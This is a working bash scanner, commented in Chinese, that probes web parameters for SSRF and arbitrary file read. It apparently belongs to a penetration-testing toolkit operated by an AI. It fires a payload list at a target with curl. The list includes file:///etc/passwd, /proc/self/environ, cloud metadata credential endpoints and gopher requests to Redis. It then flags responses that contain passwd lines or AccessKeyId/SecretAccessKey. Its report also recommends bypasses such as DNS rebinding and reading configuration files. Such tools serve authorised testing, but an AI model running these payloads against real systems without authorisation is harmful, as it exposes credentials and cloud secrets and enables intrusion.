#!/usr/bin/env bash
# tools/ssrf-probe.sh — SSRF / 任意文件读取参数自动探测
# 用法: bash tools/ssrf-probe.sh <target_dir> <url> [选项]
#
# GET 模式(默认):
#   bash tools/ssrf-probe.sh demo-target-atrenew "https://target.com/parse?url=__PAYLOAD__&other=1"
#   bash tools/ssrf-probe.sh demo-target-atrenew "https://target.com/download?file=__PAYLOAD__"
#
# JSON body 模式:
#   bash tools/ssrf-probe.sh demo-target-atrenew "https://target.com/api/fetch" \
#     --content-type application/json \
#     --body-template '{"url":"__PAYLOAD__","method":"GET"}'
#
# 输出:
#   targets/<target_dir>/recon/ssrf-probe.md          (保留在 target 目录)
#   E:/claude-artifacts/tmp/<target_key>/recon/ssrf-raw/<hash>_*.txt  (原始响应,temp workspace)

set -uo pipefail

# 确保在仓库根目录运行,输出路径相对于仓库根目录
cd "$(dirname "$0")/.."

TARGET_DIR="${1:-}"
TEMPLATE_URL="${2:-}"

if [ -z "$TARGET_DIR" ] || [ -z "$TEMPLATE_URL" ]; then
  echo "❌ 用法: bash tools/ssrf-probe.sh <target_dir> \"<url>\" [选项]"
  echo ""
  echo "GET 模式(模板中必须包含 __PAYLOAD__):"
  echo "   bash tools/ssrf-probe.sh demo-target-atrenew \"https://target.com/parse?url=__PAYLOAD__\""
  echo ""
  echo "JSON body 模式:"
  echo "   bash tools/ssrf-probe.sh demo-target-atrenew \"https://target.com/api/fetch\" \\"
  echo "     --content-type application/json \\"
  echo "     --body-template '{\"url\":\"__PAYLOAD__\",\"method\":\"GET\"}'"
  exit 1
fi

# 解析可选参数
CONTENT_TYPE=""
BODY_TEMPLATE=""
METHOD=""
shift 2
while [ $# -gt 0 ]; do
  case "$1" in
    --content-type)
      CONTENT_TYPE="${2:-}"
      shift 2
      ;;
    --body-template)
      BODY_TEMPLATE="${2:-}"
      shift 2
      ;;
    --method)
      METHOD="${2:-}"
      shift 2
      ;;
    *)
      echo "❌ 未知选项: $1" >&2
      exit 1
      ;;
  esac
done

IS_BODY_MODE=0
if [ -n "$BODY_TEMPLATE" ]; then
  IS_BODY_MODE=1
  if ! echo "$BODY_TEMPLATE" | grep -q '__PAYLOAD__'; then
    echo "❌ --body-template 中必须包含 __PAYLOAD__ 占位符"
    exit 1
  fi
  [ -z "$CONTENT_TYPE" ] && CONTENT_TYPE="application/json"
  [ -z "$METHOD" ] && METHOD="POST"
elif ! echo "$TEMPLATE_URL" | grep -q '__PAYLOAD__'; then
  echo "❌ URL 模板中必须包含 __PAYLOAD__ 占位符,或使用 --body-template"
  echo "   例: https://target.com/parse?url=__PAYLOAD__"
  exit 1
else
  [ -z "$METHOD" ] && METHOD="GET"
fi

# 加载 Python 解释器发现 + target/temp 路径公共库
source "$(dirname "$0")/../tools/lib/find-python.sh" || exit 1
srccop_require_python || exit 1
eval "$($PY "$(dirname "$0")/../tools/lib/target_paths.py" --export "targets/$TARGET_DIR")" || exit 1

# 依赖检查
missing_deps=""
for dep in curl "$PY"; do
  if ! command -v "$dep" >/dev/null 2>&1; then
    missing_deps="$missing_deps $dep"
  fi
done
if [ -n "$missing_deps" ]; then
  echo "❌ 缺少依赖:$missing_deps" >&2
  exit 1
fi

# hash 工具跨平台兼容
HASH_CMD=""
if command -v sha256sum >/dev/null 2>&1; then
  HASH_CMD="sha256sum"
elif command -v shasum >/dev/null 2>&1; then
  HASH_CMD="shasum -a 256"
else
  echo "❌ 需要 sha256sum 或 shasum" >&2
  exit 1
fi

OUT_DIR="$CLAUDE_TARGET_DIR/recon"
RAW_DIR=$($PY "$(dirname "$0")/../tools/lib/target_paths.py" --workspace-path "recon/ssrf-raw" "targets/$TARGET_DIR")
mkdir -p "$OUT_DIR" "$RAW_DIR"

REPORT="$OUT_DIR/ssrf-probe.md"
HASH_BASE="$TEMPLATE_URL"
[ "$IS_BODY_MODE" -eq 1 ] && HASH_BASE="${TEMPLATE_URL}|${BODY_TEMPLATE}|${CONTENT_TYPE}|${METHOD}"
HASH=$(echo "$HASH_BASE" | $HASH_CMD | awk '{print $1}' | head -c 16)

# 标准 SSRF / 任意文件读 payload 字典
PAYLOADS=(
  "file:///etc/passwd"
  "file:///etc/hosts"
  "file:///proc/self/environ"
  "file:///windows/win.ini"
  "file:///windows/system32/drivers/etc/hosts"
  "http://127.0.0.1/"
  "http://127.0.0.1:80/"
  "http://127.0.0.1:22/"
  "http://127.0.0.1:6379/"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://metadata.google.internal/"
  "http://100.100.100.200/latest/meta-data/"        # 阿里云
  "http://metadata.tencentyun.com/"                  # 腾讯云
  "gopher://127.0.0.1:6379/_INFO"
  "dict://127.0.0.1:6379/info"
  "ftp://127.0.0.1:21/"
  "sftp://127.0.0.1:22/"
)

# 基准请求(空/无害占位)
BASELINE_PAYLOAD="http://127.0.0.1:99999/no-such-port"

echo "━━━ ssrf-probe: $TARGET_DIR ━━━"
echo "模式  : $([ "$IS_BODY_MODE" -eq 1 ] && echo 'JSON body' || echo 'GET URL')"
echo "URL   : $TEMPLATE_URL"
[ "$IS_BODY_MODE" -eq 1 ] && echo "Content-Type: $CONTENT_TYPE" && echo "Method: $METHOD"
echo "原始响应保存: $RAW_DIR/${HASH}_*.txt"

# 先跑 baseline
baseline_raw="$RAW_DIR/${HASH}_baseline.txt"
if [ "$IS_BODY_MODE" -eq 1 ]; then
  baseline_body=$($PY -c 'import json,sys; t=sys.argv[1]; print(t.replace("__PAYLOAD__", json.dumps(sys.argv[2])))' "$BODY_TEMPLATE" "$BASELINE_PAYLOAD" 2>/dev/null || echo "")
  echo "[baseline] $METHOD $TEMPLATE_URL (body len=${#baseline_body})"
  curl -sL --max-time 15 -i -X "$METHOD" -H "Content-Type: $CONTENT_TYPE" --data-raw "$baseline_body" "$TEMPLATE_URL" -o "$baseline_raw" 2>/dev/null || true
else
  baseline_url=$(echo "$TEMPLATE_URL" | sed "s|__PAYLOAD__|$BASELINE_PAYLOAD|g")
  echo "[baseline] $baseline_url"
  curl -sL --max-time 15 -i "$baseline_url" -o "$baseline_raw" 2>/dev/null || true
fi
baseline_len=$(wc -c < "$baseline_raw" 2>/dev/null || echo 0)
baseline_status=$(grep -E '^HTTP/[0-9.]+' "$baseline_raw" 2>/dev/null | tail -1 | awk '{print $2}')
echo "      → status=$baseline_status len=$baseline_len"

# 结果收集
HITS=()
INDEX=0

for p in "${PAYLOADS[@]}"; do
  INDEX=$((INDEX + 1))
  raw_file="$RAW_DIR/${HASH}_$(printf '%02d' $INDEX).txt"

  echo "[$INDEX/$((${#PAYLOADS[@]}))] $p"
  if [ "$IS_BODY_MODE" -eq 1 ]; then
    body=$($PY -c 'import json,sys; t=sys.argv[1]; print(t.replace("__PAYLOAD__", json.dumps(sys.argv[2])))' "$BODY_TEMPLATE" "$p" 2>/dev/null || echo "")
    curl -sL --max-time 15 -i -X "$METHOD" -H "Content-Type: $CONTENT_TYPE" --data-raw "$body" "$TEMPLATE_URL" -o "$raw_file" 2>/dev/null || true
  else
    encoded_p=$($PY -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$p" 2>/dev/null || echo "$p")
    test_url=$(echo "$TEMPLATE_URL" | sed "s|__PAYLOAD__|$encoded_p|g")
    curl -sL --max-time 15 -i "$test_url" -o "$raw_file" 2>/dev/null || true
  fi

  # curl 失败时可能不创建文件,视为空响应
  if [ ! -f "$raw_file" ]; then
    echo "      → curl 未生成响应文件,视为空响应(无强信号)"
    continue
  fi

  status=$(grep -E '^HTTP/[0-9.]+' "$raw_file" 2>/dev/null | tail -1 | awk '{print $2}')
  len=$(wc -c < "$raw_file" 2>/dev/null || echo 0)
  body_file="$raw_file.body"
  # 分离 body
  sed '0,/^\r$/d;0,/^$/d' "$raw_file" 2>/dev/null > "$body_file" || true

  # 信号判断
  signal=""
  if [ "$status" = "200" ]; then
    # 检查是否读到 passwd / hosts / win.ini 特征
    if grep -qE '^(root:|bin:|daemon:|nobody:|Administrator|Windows|for 16-bit app support)' "$body_file" 2>/dev/null; then
      signal="🚨 任意文件读取成功(系统文件特征)"
    # 检查云元数据
    elif grep -qE '(ami-id|instance-id|account|AccessKeyId|SecretAccessKey|security-credentials|project-id|zone)' "$body_file" 2>/dev/null; then
      signal="🚨 云元数据读取成功"
    # 检查 redis / ftp / ssh banner
    elif grep -qE '^\$[0-9]+\r\n|^-ERR|^\+PONG|^REDIS|^SSH-|^220 .*FTP|^221' "$body_file" 2>/dev/null; then
      signal="🚨 内网服务 banner 泄露"
    fi
  fi

  # 与 baseline 差异(长度差 > 30% 或状态码不同)
  if [ -n "$status" ] && [ "$status" != "$baseline_status" ] && [ -z "$signal" ]; then
    signal="⚠️ 状态码与 baseline 不同($baseline_status → $status)"
  fi

  # 长度显著差异(不是 0 且差距 > 100 字节或 30%)
  if [ -z "$signal" ] && [ "$len" -gt 0 ] && [ "$baseline_len" -gt 0 ]; then
    diff=$((len - baseline_len))
    [ $diff -lt 0 ] && diff=$((-diff))
    if [ "$diff" -gt 100 ] && [ "$diff" -gt $((baseline_len / 3)) ]; then
      signal="⚠️ 响应长度与 baseline 显著差异($baseline_len → $len)"
    fi
  fi

  if [ -n "$signal" ]; then
    echo "      $signal"
    HITS+=("$p|$status|$len|$signal|$raw_file")
  else
    echo "      → status=$status len=$len (无强信号)"
  fi
done

# 生成报告
cat > "$REPORT" <<EOF
# SSRF / 任意文件读取探测报告

**目标目录**: $TARGET_DIR
**探测 URL**: $TEMPLATE_URL
**模式**: $([ "$IS_BODY_MODE" -eq 1 ] && echo "JSON body ($METHOD / $CONTENT_TYPE)" || echo "GET URL")
**Body 模板**: $([ "$IS_BODY_MODE" -eq 1 ] && echo "\`$BODY_TEMPLATE\`" || echo "无")
**生成时间**: $(date '+%Y-%m-%d %H:%M:%S')
**Baseline**: $BASELINE_PAYLOAD
**Baseline 状态**: $baseline_status
**Baseline 长度**: $baseline_len 字节

## 命中摘要

EOF

if [ ${#HITS[@]} -eq 0 ]; then
  echo "未检测到强信号。所有 payload 响应与 baseline 一致或无系统文件/元数据特征。" >> "$REPORT"
else
  echo "| # | Payload | HTTP | 长度 | 信号 | 原始响应 |" >> "$REPORT"
  echo "|---|---|---|---|---|---|" >> "$REPORT"
  idx=0
  for hit in "${HITS[@]}"; do
    idx=$((idx + 1))
    IFS='|' read -r p st len sig raw <<< "$hit"
    echo "| $idx | \`$p\` | $st | $len | $sig | \`$raw\` |" >> "$REPORT"
  done
fi

cat >> "$REPORT" <<EOF

## 全部测试 payload

EOF

INDEX=0
for p in "${PAYLOADS[@]}"; do
  INDEX=$((INDEX + 1))
  echo "$INDEX. \`$p\` → \`$RAW_DIR/${HASH}_$(printf '%02d' $INDEX).txt\`" >> "$REPORT"
done

cat >> "$REPORT" <<EOF

## 下一步建议

1. 对 🚨 命中项立即人工复核原始响应文件,确认是否为真实 SSRF / 任意文件读取。
2. 对 ⚠️ 差异项,检查响应 body 是否有业务错误差异泄露(如 "Connection refused" vs "No route to host")。
3. 若确认 SSRF,尝试协议走私、IP 进制绕过、DNS rebinding 等进阶绕过。
4. 若确认任意文件读取,扩展 payload 字典读取关键配置文件(/proc/self/environ、应用日志、数据库配置)。
5. 所有命中必须经 AI 现场编写 `output/poc-<finding_id>.py` 并运行验证后才能写入 findings.md。

EOF

echo ""
echo "━━━ 报告 ━━━"
echo "$REPORT"
if [ ${#HITS[@]} -gt 0 ]; then
  echo "命中数: ${#HITS[@]}"
fi
